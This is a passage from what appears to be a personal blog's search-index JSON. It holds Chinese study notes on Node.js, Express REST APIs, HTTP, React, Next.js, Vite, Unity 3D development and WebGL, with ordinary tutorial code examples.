Stream\nStream是一个抽象接口，node中很多对象实现了这个接口；\n例如对http服务器发起请求的request对象就是一个stream还有stdout；\n\n","slug":"NodeJS From W3C","date":"2023-04-05T07:29:35.904Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"149b6b8f88b70e37d7dc7c91652114bf","title":"摄影日常","content":"鼋头渚\n风铃\n\n\n\n赏樱楼\n\n\n\n\n","slug":"Sakura","date":"2023-04-04T13:51:45.000Z","categories_index":"日常","tags_index":"摄影","author_index":"Martin"},{"id":"149b6b8f88b70e37d7dc7c91652114bf","title":"摄影日常","content":"摄影日常LCY\nBurger King\nSakura\n","slug":"摄影日常","date":"2023-03-27T11:51:45.000Z","categories_index":"日常","tags_index":"摄影","author_index":"Martin"},{"id":"1a257d6e815878cf44406642d07ac6c8","title":"3D游戏开发","content":"3D游戏开发一、3D实体搭建1.3D实体位姿态\n位置：Position（x,y,z）\n旋转：Rotation（x,y,z)\n缩放：Scale（x,y,z)\n\n\nUnity中，绝大部分情况下，是先缩放，后旋转，最后平移；\n\n3D实体的创建\n通过加载3D模型创建，如fbx、gltf、obj\n通过组合参数化的基本集合体创建\n\n实体绘制\n材质\n颜色\n纹理\n\n预制体\n将游戏对象保存在工程中，在需要的时候创建出来，这就是预制体；\n预制体存储者一个游戏对象，包括游戏对象的所有组件以及其下的所有子游戏对象；\n\n二、相机、光照、天空盒1.相机\nClear Flag\n背景颜色\nCulling Mask\n投影（透视、正交）\n\n透视是存在近大远小，正交是没有的；\n\n2.光照\n类型：点光源、平行光、聚光灯、面积光\n颜色\n强度\n阴影乐星\n\n3.天空盒\n相机的清除标志设为“天空盒”\n窗口-渲染-照明设置\n环境-天空盒材质\n\n三、控制和碰撞1.启动流程\n2.控制逻辑\n添加刚体组件（运动过程中不会发生形变的物体）\n\n添加组件；\nUse Gravity设置为false\nisKinematic设置为true，飞船通过脚本而非力影响运动属性\n设置constraints，冻结z轴位移以及x、y、z轴旋转\n\n\n\n添加自定义脚本\n\nadd component &gt; new script\n\nMonoBehavior是一个基类，所有Unity脚本都派生自该类；\n\n\nInput.GetAxis()和输入管理器InputManager\nInputManager是Unity设置输入响应方式的管理列表，Edit &gt; Project &gt; Setting &gt; Input\n\n\n添加敌机\n\n需要使用另一个脚本；\n不受按键控制；\n\n随机生成敌机\n新建一个Main的C#脚本，绑定到Main camera(因为敌机伴随整个游戏周期，所以绑定到Camera)\n\n3.碰撞逻辑标签\nEdit &gt; Project &gt;Tags and Layers 命令\n不同Layers的实体不会发生碰撞；\n\n物理管理器\nEdit &gt; Project Setting &gt; Physics\n\n\n碰撞\n3D中球体的体积碰撞只需要计算两个球体球心的距离和两个实体半径之和；\n\n四、玩法逻辑和UI1.添加新的刚体\n子弹\n升级道具\n\n2.添加玩法\n为每一个敌机设计分数\n添加计分板\n\n\n推荐课程\n现代计算机图形学入门-闫令其\n现代游戏引擎入门必修课-王希\n高质量试试渲染-闫\n\n","slug":"3D游戏实战","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"3D,笔记","author_index":"Martin"},{"id":"b5f7853819177df9fb539228bb5fe3c1","title":"HTTPS实用指南","content":"HTTPS实用指南一、初识1.背景知识输入网址获得网页的过程？\n\nHTTP发展\n2.报文内容\n常用请求头\n\n\n常用响应头\n\n\n3. Methods\n\n安全的（不会修改服务器数据）：GET HEAD OPTIONS\n幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；\n\n4.状态码\n5. Restful API\n每一种URL代表一种资源；\n客户端和服务器之间，传递这种资源的某种表现层；\n客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；\n\n\n6.缓存\n\n强缓存资源本地有就直接用本地资源\n协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；\n\n缓存流程示意\n\n\n7. Cookie\n8. HTTP/2\n更快、更稳定、更简单\n\n\n使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；\n采用二进制编码，效率更高，有更好的压缩算法；\n消息：与逻辑请求或者响应消息对应的完整的一系列帧；\n数据流：已建立的连接内双向字节流，可以承载一条或多条消息；\n交错发送，接收方重组织；\n链接都是永久的，而且仅需要每个来源一个连接；\n流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）\n\n\n9.  HTTPS经过TSL&#x2F;SSL加密\n\n\n二、HTTP协议的应用场景分析1.静态资源方案：缓存+CDN+文件名Hash\n\n\nCDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；\n文件名Hash来保证每次刷新获得的资源是最新的；\n\n2.登录头条页面密码登录会发出两个请求；\n\n请求1的Methods是OPTIONS：跨域、cross-origin\n\n一个url由scheme+host name+port组成\ne.g. https:&#x2F;&#x2F;www.example.com:443\n跨域：scheme、host name、prot任意一个有区别都认为是跨域；\nNote：如果https没有写明443端口号也可以认为是同域；http默认80；port可以不写；\n\n\n跨域\n\n\n跨域解决方案：\nCORS\n代理服务器：同源策略是浏览器的安全策略，不是http的\n\n\n\nIFrame：存在诸多不便；\n\n\n鉴权\nsession+cookie\nJWT（JSON web token）token具有唯一性；\n\n\n\nSSO（Single Sign On）：单点登录\n\n重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；\n三、实战1. Ajax之XHR2.常用请求库Axios（参考官网）3.网络优化（需要补充）\n4.稳定性\n重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；\n缓存合理使用，作为最后一道防线；\n\n\n四、拓展1.Websocket\n进行全双工的通讯；\n实时性要求较高，例如聊天室；（开启聊天室demo）\nurl使用ws:// 或者 wss：//\n\n2.QUIC（Quick UDP Internet Connection）\n相比于TCP更快；\n可靠性类似于TCP；\n支持h2的多路复用，没有TCP的HOL文通；\n前向纠错FEC\n用户空间的阻塞算法，最新的BBR算法；\n\n","slug":"HTTP","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,计算机网络","author_index":"Martin"},{"id":"9aba8ff8d082e3955ddb99d093b9c44c","title":"Next","content":"Next一、CSR、SSR、SGR1.基础概念\nB端指内部使用的管理平台\nC端面向公网外部用户\n\n2.CSR客户端渲染\n常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；\nSPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；\n\n3.SSR服务端渲染\n从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；\n\n4.同构SSR\nBFF：backend For Frontend 服务于前端应用的后端\n前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；\n前后端都需要参与渲染，而且首次渲染出的HTMl要一样；\n\n\n5.SSG静态站点生成\n在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；\nCDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；\n相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；\n缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；\n\nSSR、SSG的优势：\n因为不需要请求大量的JS文件，这就使得SSR&#x2F;SSG可以拥有更短的首屏时间；\n\n\n二、NextJS1.React的SSR基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；\n\n2.NextJS\n构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；\n\n3.使用npx create-next-app@latest --typescript\n\n后面的看不懂，建议先看Next官网了解；\n","slug":"NextJS","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,Nuxt","author_index":"Martin"},{"id":"e87d219c8babe95023e8a1174854d4ca","title":"NoDe JS 实战","content":"NoDe JS 实战一、Welcome to node1.NodeJS基础\n显著特征：异步、事件驱动机制\nNode和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件\n非阻塞I/O\n\n\n程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果\n\n\nNode与V8\n\n\nNode的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。\n\n\n特性组\n\nNode包含了v8提供的ES6特性，分为shipping、staged、in progress三组；\n其中shipping是默认开启的，staged和in progress需要命令行参数开启\n\nnode --harmony\nnode --v8-options | grep \"in progress\"\nnpm\n\n npm要求Node项目目录下有一个package.json文件；\n\nnpm init -y    //初始化package.json\n核心模块\n\n\n\nfs，path，net，http/s，dns，assert，os\n\n\n//调取文件流\nconst fs=require('fs');\nconst zlib=require('zlib');\nconst gzip=zlib.createGzip();\nconst outStream=fs.createWriteStream('output.js.gz');\n\nfs.createReadStream('./fs.js').pipe(gzip).pipe(outStream);\n\n//网络模块\nconst http=require('http');\nconst port=8080;\n\nconst server=http.createServer((req,res)=>&#123;\n    res.end(\"HEllo,node js!\");\n&#125;);\n\nserver.listen(port,()=>&#123;\n    console.log(\"Server listening on:http://localhost:%s\",port);\n&#125;);\n\n//调试器\nnode debug server.js\n\n\n主流Node程序：Web、命令行工具、桌面程序 \n\n\nNode可以将TS转换为JS；\n\n二、Node编程基础\n如何组织代码？\n如何实现异步编程？\n\n1.Node功能的组织及重用\n\n上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；\nPHP和Ruby等语言使用命名空间来解决问题；\nNode选择不给程序员污染全局命名空间的机会；\nNode模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。\n\n\n2.创建一个Node项目mkdir myApp\ncd myApp\nnpm init -y   //全部使用默认值的package\n\n\nrequire是Node中少数几个同步I/O操作之一；\nI/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；\n\n3. node_modules重用模块\n要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。\nNode有一个独特的模块引入机制，即node_modules,其模块检索规则如下：\n\n\n注意事项：\n如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；\n\n&#123;\n    \"main\":\"currency.js\"\n&#125;\n\n\n\nNode能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。\n\n\n！！！！！！不能实现4.异步编程Node世界的两种响应逻辑方式：\n\n回调：通常用来定义一次性响应的逻辑。比如数据库查询；\n事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；\n\n//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数\n\nserver.on('request',handleRequest);\n\nNode Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；\nNode的很多核心功能都继承自EventEmitter；\n用回调处理一次性事件\n回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。\n\n实例如下：\n\n异步获取存放在json文件中的文章标题\n异步获取简单的HTML模板\n将标题组装到HTML页面里\n将HTML发送给客户\n\nconst http=require('http');\nconst fs=require('fs');\n\nhttp.createServer((req,res)=>&#123;\n    getTitles(res);\n&#125;).listen(8000,'127.0.0.1');\n\n//将回调嵌套的功能代码提取出来\nfunction getTitles(res)&#123;\n    fs.readFile('./data/title.json',(err,data)=>&#123;\n        if(err) return hadError(err,res);\n        getTemplate(JSON.parse(data.toString()),res);\n    &#125;);\n&#125;\n\nfunction getTemplate(titles,res)&#123;\n    fs.readFile('./index.html',(err,data)=>&#123;\n        if(err) return hadError(err,res);\n        formatHtml(titles,data.toString(),res);\n    &#125;)\n&#125;\n\nfunction formatHtml(titles,templ,res)&#123;\n    const html=templ.replace('%',titles.join('&lt;/li>&lt;li>'));\n    res.writeHead(200,&#123;'Content-Type':'text/html'&#125;);\n    res.end(html);\n&#125;\n\nfunction hadError(err,res)&#123;\n    console.log(err);\n    res.end(\"Server Error\");\n&#125;\n\n用事件发射器处理重复性事件\n事件发射器会触发事件，并且在那些事件被触发时能处理他们；\n重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；\n\nsocket.on('data',handleData)\n\necho服务器的例子：\nconst net=require('net');\nconst server=net.createServer(socket=>&#123;\n    socket.on('data',data=>&#123;\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    &#125;);\n    //只响应一次\n    socket.once('data',data=>&#123;\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    &#125;);\n&#125;);\n\nserver.listen(8000,'127.0.0.1');\n\ntelnet 127.0.0.1 8888\n\n一个PUB/SUB的例子下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；\n//定义\nconst EventEmitter=require('events').EventEmitter;\nconst channel=new EventEmitter();\nchannel.on('join',()=>&#123;\n    console.log(\"Welcome!\");\n&#125;)\n\n//触发事件/发射事件/join是事件名称，可以为任何值\nchannel.emit('join');\n\n完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：\nconst events=require('events');\nconst net=require('net');\nconst channel=new events.EventEmitter();\nvar fullMessage=\"\";\n\nchannel.clients=&#123;&#125;;\nchannel.subscriptions=&#123;&#125;;\n\nchannel.on('join',function(id,client)&#123;\n    this.clients[id]=client;\n    const welcomeMessage=`Welcome! $&#123;this.listeners('broadcase').length+1&#125; guests online!`;\n    client.write(`$&#123;welcomeMessage&#125;\\n`);\n    this.subscriptions[id]=(senderId,message)=>&#123;\n        if(id!=senderId)&#123;\n            this.clients[id].write(\"Message from user \"+id+\":\"+message+\".\\n\");\n        &#125;\n    &#125;;\n    this.on('broadcase',this.subscriptions[id]);\n    console.log(`$&#123;id&#125; has enter the chatroom.\\n`);\n    channel.emit('boradcast',id,`$&#123;id&#125; has enter the chatroom.\\n`);\n&#125;);\n\n//绑定leave事件；\nchannel.on('leave',function(id)&#123;\n    channel.removeListener('broadcast',this.subscriptions[id]);\n    console.log(`$&#123;id&#125; has left the chatroom.\\n`);\n    channel.emit('boradcast',id,`$&#123;id&#125; has left the chatroom.\\n`);\n&#125;);\n\n//绑定lshuwdown事件,提出所有用户；\nchannel.on('shutdown',function(id)&#123;\n    channel.emit('broadcast','','The server has shut down.\\n');\n    console.log(`$&#123;id&#125; has close the chatroom.\\n`);\n    channel.removeAllListeners('broadcast');\n&#125;);\n\n//设定监听器最多的数量为50；\nchannel.setMaxListeners(50);\n\nconst server=net.createServer(client=>&#123;\n    const id=`[$&#123;client.remoteAddress&#125;:$&#123;client.remotePort&#125;]`;\n    channel.emit('join',id,client);\n    client.on('data',data=>&#123;\n        data=data.toString();\n        if(data==='*')&#123;\n            channel.emit('shutdown',id);\n        &#125;\n        if(data==='-')&#123;\n            channel.emit('leave',id);\n        &#125;\n        channel.emit('broadcase',id,data);\n    &#125;);\n    client.on('close',()=>&#123;\n        channel.emit('leave',id);\n    &#125;);\n&#125;);\n\nserver.listen(8888);\n\n5.异步开发的难题\n创建异步程序时，需要关注：\n1.事件轮询的条件；\n2.程序变量；\n3.其他随程序逻辑执行而发生变化的资源；\n\n//作用域是如何导致bug出现的\n\nfunction  asyncFunction(callback)&#123;\n    setTimeout(callback,200);\n&#125;\n\nlet color='green';\t\t\t\t//初始color\nasyncFunction(()=>&#123;\n    console.log(`The color is $&#123;color&#125;.`);\t\t\t//等待200ms输出color\n&#125;);\n\ncolor='blue'\t\t\t//结果为输出blue；\n\n\nJS闭包可以冻结color的值；\n下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。\n\ncolor='blue'\t\t\t\n(color=>&#123;\n    asyncFunction(()=>&#123;\n        console.log(`The color is `,color);\n    &#125;);\n&#125;)(color);\n\ncolor='green';\t\t\t\t//结果为输出blue；\n\n6.异步逻辑的顺序化\n让一组异步任务顺序执行的概念被Node社区称为流程控制；\n控制分为：串行、并行\n\n\n（1）串行流程控制//以下代码用回调让任务顺序执行\nsetTimeout(()=>&#123;\n    console.log(\"Wait 1000ms...\");\n    setTimeout(()=>&#123;\n        console.log(\"Wait 500ms...\");\n        setTimeout(()=>&#123;\n            console.log(\"Wait 100ms...\");\n        &#125;,100)\n    &#125;,500)\n&#125;,1000)\n\n实际情况中可能是读取文件、发送http请求等；\n借助async流程控制工具执行npm install async\n\nconst async=require('async');\n\n//维护一个顺序数组\nasync.series([\n    callback=>&#123;\n        setTimeout(()=>&#123;\n            console.log(\"Wawit 1000ms...\");\n            callback();\n        &#125;,1000);\n    &#125;,\n    callback=>&#123;\n        setTimeout(()=>&#123;\n            console.log(\"Wawit 500ms...\");\n            callback();\n        &#125;,500)\n    &#125;,\n    callback=>&#123;\n        setTimeout(()=>&#123;\n            console.log(\"Wawit 100ms...\");\n            callback();\n        &#125;,100);\n    &#125;\n]);\n\n\n可读性、可维护性更强；\n刻意回避回调嵌套；\n\n（2）实现串行化流程控制\n按照预期执行的顺序维护一个数组；\nFIFO方法完成任务；\n每个任务完成以后调用一个函数来返回任务执行的成功与否；\n\nfunction TaskA()&#123;\n    console.log(\"Doing work A!\");\n    next();\n&#125;\n\nfunction TaskB()&#123;\n    console.log(\"Doing work B!\");\n    next();\n&#125;\n\nfunction TaskC()&#123;\n    console.log(\"Doing work C!\");\n    next();\n&#125;\n\n//维护的一个数组；\nconst tasks=[TaskA,TaskB,TaskC];\n\nfunction next(err,result)&#123;\n    if(err) throw err;\t\t\t\t   //如果出错，就抛出错误\n    const currentTask=tasks.shift();\t//没有出错，移动数组；\n    if(currentTask)&#123;\n       currentTask(result);\n    &#125;\n&#125;\n\nnext();\n\n（3）实现并行化流程控制\n为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；\n\n（4）利用社区的工具进行流程控制\nAsync\nStep\nSeq\n\n三、Node Web\n创建一个新的Web程序\n搭建RESTful服务\n持久化数据\n使用模板\n\n1.Node Web程序结构\npackage.json  包含依赖项列表和运行这个程序的命令的文件；\npublic/             静态资源文件夹，css/客户端js都在这；\nnode_modules/ 项目的依赖项会安装到这里；\n\n程序代码\napp.js/index.js          设置程序的代码；\nmodels/                    数据库模型；\nviews/                       用来渲染的页面模板；\ncontrollers/routes      HTTP请求处理器；\nmiddleware/              中间件组件；\n\n\n如何组织程序是我的自由，大部分web框架都很灵活；\n\nnpm install --save express\nnpm rm express --save\n\n一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；\nconst express=require('express');\n\nconst app=express();\n\nconst port=process.env.PORT || 3000;\n\napp.get('/',(req,res)=>&#123;\n    res.send(\"Hello,world!\");\n&#125;);\n\napp.listen(port,()=>&#123;\n    console.log(`Express web app available at localhost:$&#123;port&#125;`);\n&#125;)\n\nnpm脚本\n启动服务起的命令（node index.js）可以保存问npm脚本；如下可以使用npm start启动项目；\n\n\"scripts\": &#123;\n   \"start\":\"node index.js\"\n &#125;,\n\n搭建一个RESTful Web服务\nPOST  /articles   \nGET    /articles/:id\nGET    /articles\nDELETE  /articles/:id\n\ncurl http://127.0.0.1:3000/articles/0\ncurl -X DELETE http://127.0.0.1:3000/articles/0\n\n#官方消息体解析器\nnpm install --save bodt-parser\n\nconst express=require('express');\nconst bodyParser=require('body-parser');\n\nconst articles=[&#123;title:'NodeJS入门'&#125;,&#123;title:'VueJS入门'&#125;,&#123;title:'深入浅出VueJS'&#125;];\n\nconst app=express();\n\napp.set('port',process.env.PORT||3000);\n\napp.use(bodyParser.json());\napp.use(bodyParser.urlencoded(&#123;extended:true&#125;));\n\n\napp.get('/articles',(req,res,next)=>&#123;\n    res.send(articles);\n&#125;);\n\napp.get('/articles/:id',(req,res,next)=>&#123;\n    const id=req.params.id;\n    console.log(\"Fetching article \",id,\".\");\n    res.send(articles[id]);\n&#125;);\n\napp.delete('/articles/:id',(req,res,next)=>&#123;\n    const id=req.params.id;\n    console.log(\"Deleting article \",id,\".\");\n    delete articles[id];\n    res.send(&#123;message:'Article has been deleted.'&#125;);\n&#125;);\n\napp.post('/articles',(req,res,next)=>&#123;\n    const article=&#123;title:req.body.title&#125;;\n    articles.push(article);\n    res.send(articles);\n&#125;);\n\napp.listen(app.get('port'),()=>&#123;\n    console.log('App started on port ',app.get('port'));\n&#125;);\n\nmodule.exports=app;\n\n\n到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：\n永久保存数据到数据库；\n形成可读版本的文章；\n\n#模板引擎\nnpm install ejs --save\n\n2.Node Web开发\n现代Web开发中，使用Node来进行工具和服务的情况越来越多；\n需要负责和配置维护工具库；\n本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；\n\n前端构建工具的优点：\n代码简单易懂；\n支持代码转译；\n源码映射；\n\nWebpck\n快速搭建支持增量式结构的构建系统；\n\n五、服务器端框架\n使用热门的Node Web框架；\n选择合适的框架；\n用Web框架搭建Web程序；\n\n1.用户画像\n假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；\n徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？\n\n\n文件上传下载阅读–Express\n生成PDF的微服务–hapi\n电子商务组件–SailJS\n\n使用用户画像考虑设计问题是通用做法。\n","slug":"NodeJS实战读书笔记","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,Node","author_index":"Martin"},{"id":"d9e53d39e48f5c5aa42bf2e7c031bcd1","title":"React","content":"React一、应用\n前端应用\n移动原生\n桌面应用Electron  React 3D\n\n二、原型\nFacebook在其php生态中引入了组合式组件的思想，启发了后来的react设计\nJ.W创建了FaxJS,也就是React的原型；\nFacebook收购ins后，该项目在内使用，基于FaxJS创建了React；\n\n三、React设计思路1.UI编程痛点\n状态更新，UI不会自动更新，需要手动调用DOM\n欠缺基本的代码层面的封装和隔离，代码层面没有组件化\nUI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”\n\n2.响应式与转换式\n转换式：给定输入求解输出；  （编译器、数值计算）\n响应式：监听事件没消息驱动； （监控系统、UI界面）\n\n事件-&gt;执行既定的回调-&gt;状态更新-&gt;UI更新\n\n3.响应式编程\n状态更新，UI自动更新\n前端代码组件化、可复用、可封装\n状态之间的互相依赖关系、只需要声明计科\n\n4.组件化\n组件是组件的组合/原子组件\n组件内部拥有状态，外部不可见\n父组件可将状态传入组件内部\n\n5.状态归属问题Note：共享变量需要提升到最近的祖先组件、可以用状态管理解决；\nE.g:如果状态归属于两个节点，就向上寻找到最近的祖宗节点；\n\n\n\nJavascript中、函数是【一等公民】\n**通过向子组件传递function来改变根组件的变量（形成双向数据流）\n\n6.思考\nReact是单向数据流、还是双向数据流？\n\n\n其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；\n\n\n如何解决状态不合理上升的问题？（第五节解决）\n\n\n状态管理库\n\n\n组件的状态改变之后，如何更新DOM？（第四节解决）\n\n\n1\n\n7.组件设计\n组件声明了状态和UI的映射；\n组件拥有Props/State两种状态；\n组件可由其他组件拼装而成；\n\n解法：\n\n组件内部拥有私有状态State\n组件接受外部的Props状态提供复用性\n根据当前的state/props返回一个UI\n\nfunction Component(props)&#123;\n    const &#123;url&#125;&#x3D;props;\n    this.text&#x3D;&#39;click me&#39;;\n    \n    return(\n    \t&lt;div&gt;\n        \t&lt;SubComponent props&#x3D;&#123;&#123;color:&#39;red&#39;&#125;&#125;&gt;&lt;&#x2F;SubComponent&gt;\n            &lt;img src&#x3D;&#123;url&#125;&gt;&lt;&#x2F;img&gt;\n            &lt;button&gt;clike me&lt;&#x2F;button&gt;\n        &lt;&#x2F;div&gt;\n    )\n&#125;\n\n8.生命周期\n9.React Hooksimport React,&#123;useState&#125; from &#39;react&#39;;\n\nfunction Example()&#123;\n    &#x2F;&#x2F;声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；\n    const [count,setState]&#x3D;useState(0);\n    \n    &#x2F;&#x2F;传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行\n    &#x2F;&#x2F;有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；\n    useEffect(()&#x3D;&gt;&#123;\n        document.title&#x3D;&#96;You clicked $&#123;count&#125; times&#96;;\n    &#125;)\n    \n    return(\n    \t&lt;div&gt;\n        \t&lt;p&gt;Clicked &#123; count &#125; times&lt;&#x2F;p&gt;\n            &lt;button onClick&#x3D;&#123;()&#x3D;&gt;setCount(count+1)&#125;&gt;Click +1&lt;&#x2F;button&gt;\n        &lt;&#x2F;div&gt;\n    )\n&#125;\n\nHook使用法则\n不要在循环、条件或嵌套中调用hook\n\n四、React实现1.Problems\nJSX不符合JS语法标准；\n\n\n\n返回的JSX发生改变时，如何更新DOM；\n\n\n计算新旧JSX的Difference\n\n\n指令式：说一步做一步\n声明式\n响应式\n\n\n\nstate改变-&gt;计算diff-&gt;更新dom\n\nHow to diff?\n\n更新次数少&lt;----tradeoff----&gt;计算速度快\n完美的最小Diff算法，需要O(n^3)\n换取时间，需要O（n）\n\n\n\n\n元素\n更新方法\n\n\n\n不同类型元素\n替换\n\n\n同类型的DOM元素\n更新\n\n\n同类型的组件元素\n递归\n\n\n弊病：最顶层的父组件状态发生改变，子组件全部更新\n\nstate/props改变时，如何重新触发render函数；\n\n五、React状态管理库1.核心思想\n***将状态抽离到UI外部进行统一管理\n只存放需要共享的、距离较远的\n\n2.常用管理库推荐\nredux\nxstate\nmobx\nrecoil\n\n3.状态机\n当前状态，收到外部事件，迁移到下一个状态\n\n4.ModernJS/Reduck六、应用级框架科普\nNextJS  (研究一下Vercel)\nModernJS (Web Infra)全栈开发框架\nBlitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 \n\n","slug":"React","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,React","author_index":"Martin"},{"id":"95a504c95e3e0ccf4ebea428f814913b","title":"Vite知识体系","content":"Vite知识体系一、浅谈构建工具1. Why we need build tools?\n模块化（ESM、CommonJS、UMD）\n资源编译（高级语法的编译）\n产物质量（代码提及、代码性能）\n开发效率（热更新）\n\n2.构建工具的意义\n提供模块加载方案、兼容不同的模块规范；\n高级语法转义（Sass，TS）、资源加载如图片、字体、worker；\n产物压缩、无用代码删除、语法降级；\n热更新；\n\n3.Vite是什么？Why vite？组成：\nNo-bundle开发服务、源文件无需打包；\n生产环境基于Rollup的Bundler；\n\n核心特征：\n高性能，dev启动速度和热更新速度非常快；\n简单易用，开发者体验好；\n\n4.当下问题问题\n缓慢启动；\n缓慢的热更新；\n\n瓶颈\nbundle带来的性能开销；\nJS语言的性能瓶颈；\n\n行业趋势\n全球浏览器对原生ESM的普遍支持；\n\n1.script标签增加type&#x3D;“module”属性；\n2.使用ESM模块导入导出语法；\n\n\n\n基于原生语言（Go、Rust）编写前端编译工具链；\n\n\n二、Vite概要1.内置Web构建功能\n\n三、Vite上手1.项目初始化# 提前安装pnpm\nnpm i -g pnpm\n\n# 初始化命令\npnpm create vite\n\n#安装依赖\npnpm install\n\n#启动项目\nnpm run dev\n\n#安装sass\npnpm install sass -D\n\n#打包\ntsc &amp;&amp; vite build\n\n\nimport * as React from 'react';\nimport &#123; Component &#125; from 'react';\nimport styles from './index.module.scss';\n\nexport function Header()&#123;\n    return (\n        &lt;div>&lt;h1 className=&#123;styles.header&#125;>Header&lt;/h1>&lt;/div>\n    )\n&#125;\n\n.header&#123;\n    color:red;\n&#125;\n\n2.无需额外配置\n可以保存组件状态：修改A组件代码时，Web热更新之后，不会影响其他组件的状态；\n\n3.Tree Shaking原理\n基于ESM的import/export语句依赖关系，与实时状态无关；\n在构建阶段将未使用到的代码进行删除；\nTree shaking 在vite中无需配置，默认开启；\n\n4.优点\n响应迅速\n开箱即用\n\n四、Vite整体架构\n1.单文件编译\n使用Esbuild编译TS/TSX；\n预打包：扫描代码进行预先打包；\n\n优势\n编译速度提升10-100X\n\n缺点\n不支持类型检查；（运行之前需要调用tsc）\n不支持语法降级到ES5；\n\n2.代码压缩\nEsbuild作为默认压缩工具，替换传统的Terser、Uglify.js等压缩工具；\n\n3.插件机制\n开发环境：模拟roolup插件机制\n生产环境：直接使用rollup\n\n五、Vite进阶路线1.深入双引擎\nesbuild\nrollupJS\n\n学习\n查看官方文档\n先了解基本使用，动手尝试各项常用配置；\n学习其插件开发；\n\n2.插件机制\n易于抽离核心逻辑\n易于拓展\n\n\n\nconfig\nresolveId\nload\ntranform\n\n\n3.学习\nVite插件开发文档；\n学习其他插件实现，json加载等；\n\n4.拆包（代码分割）\n5.JS编译工具（Babel）源代码-&gt;AST-&gt;AST-&gt;降级代码\n\nAST为抽象语法树；\n\n6.语法安全降级\n\n上层解决方案：plugin-legacy\n底层原理：借助babel实现；提前注入polyfill；\n\n7.服务端渲染（SSR）\n提升首屏性能\nSEO优化；\n\n\n8.深入理解底层标准\n","slug":"Vite知识体系","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,项目构建","author_index":"Martin"},{"id":"52c50e0cffff29ad32e5e64ba6840c70","title":"WebGL","content":"WebGL一、Why WebGL？Why GPU？GPU!&#x3D;WebGL!&#x3D;3D\n\n1.现代图形系统\n光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；\n像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；\n帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；\n\n具体步骤\n轮廓提取/ 